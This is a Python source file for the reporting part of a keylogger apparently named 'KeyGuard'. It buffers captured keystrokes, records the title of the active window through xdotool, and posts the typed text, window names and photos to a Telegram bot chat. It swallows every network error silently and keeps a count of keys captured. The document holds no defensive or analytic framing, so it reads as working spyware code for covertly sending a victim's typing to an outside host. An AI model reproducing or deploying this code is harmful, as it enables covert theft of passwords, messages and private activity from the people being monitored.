import threading
import requests
import time
import subprocess
from queue import Queue, Empty


def get_active_window():
    try:
        result = subprocess.run(
            ["xdotool", "getactivewindow", "getwindowname"],
            capture_output=True, text=True, timeout=2
        )
        return result.stdout.strip() or None
    except:
        return None


class Reporter:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.queue = Queue()
        self.worker = None
        self.running = False
        self.base_url = f"https://api.telegram.org/bot{token}"

        self.buffer = ""
        self.last_key_time = 0
        self.flush_delay = 3.0
        self.max_buffer = 200

        self.current_window = None
        self.last_window_check = 0
        self.window_check_interval = 1.0

        self.key_count = 0
        self.start_time = None

    def send_message(self, text: str):
        try:
            requests.post(
                f"{self.base_url}/sendMessage",
                data={"chat_id": self.chat_id, "text": text},
                timeout=5,
            )
        except:
            pass

    def send_photo(self, photo_path: str):
        try:
            with open(photo_path, "rb") as f:
                requests.post(
                    f"{self.base_url}/sendPhoto",
                    data={"chat_id": self.chat_id},
                    files={"photo": f},
                    timeout=15,
                )
        except:
            pass

    def get_status(self):
        uptime = int(time.time() - self.start_time) if self.start_time else 0
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        return (
            f"KeyGuard Status\n"
            f"Uptime: {hours}h {minutes}m {seconds}s\n"
            f"Keys captured: {self.key_count}\n"
            f"Window: {self.current_window or 'Unknown'}"
        )

    def _flush_buffer(self):
        if self.buffer:
            ts = time.strftime("%H:%M:%S")
            text = f"[{ts}] {self.buffer.rstrip()}"
            if text:
                self.send_message(text)
            self.buffer = ""

    def _check_window(self):
        now = time.time()
        if now - self.last_window_check < self.window_check_interval:
            return
        self.last_window_check = now

        window = get_active_window()
        if not window:
            return

        if window != self.current_window:
            self.current_window = window
            self.send_message(f"[Window] {window}")

    def _process_key(self, key):
        self.last_key_time = time.time()
        self.key_count += 1

        if key == "\n":
            self.buffer += "\n"
            self._flush_buffer()
        elif key == "<Backspace>":
            if self.buffer and not self.buffer.endswith("\n"):
                self.buffer = self.buffer[:-1]
        elif key.startswith("[") and key.endswith("]"):
            self._flush_buffer()
            self.send_message(key)
        elif key.startswith("<") and key.endswith(">"):
            self._flush_buffer()
            self.send_message(key)
        else:
            self.buffer += key

        if len(self.buffer) >= self.max_buffer:
            self._flush_buffer()

    def _worker_loop(self):
        self.start_time = time.time()
        self.current_window = get_active_window()
        if self.current_window:
            self.send_message(f"[Window] {self.current_window}")

        while self.running:
            try:
                key = self.queue.get(timeout=0.3)
                self._process_key(key)
            except Empty:
                self._check_window()
                if self.buffer and (time.time() - self.last_key_time) >= self.flush_delay:
                    self._flush_buffer()

    def start(self):
        self.running = True
        self.worker = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker.start()

    def stop(self):
        self.running = False
        if self.worker:
            self.worker.join(timeout=5)
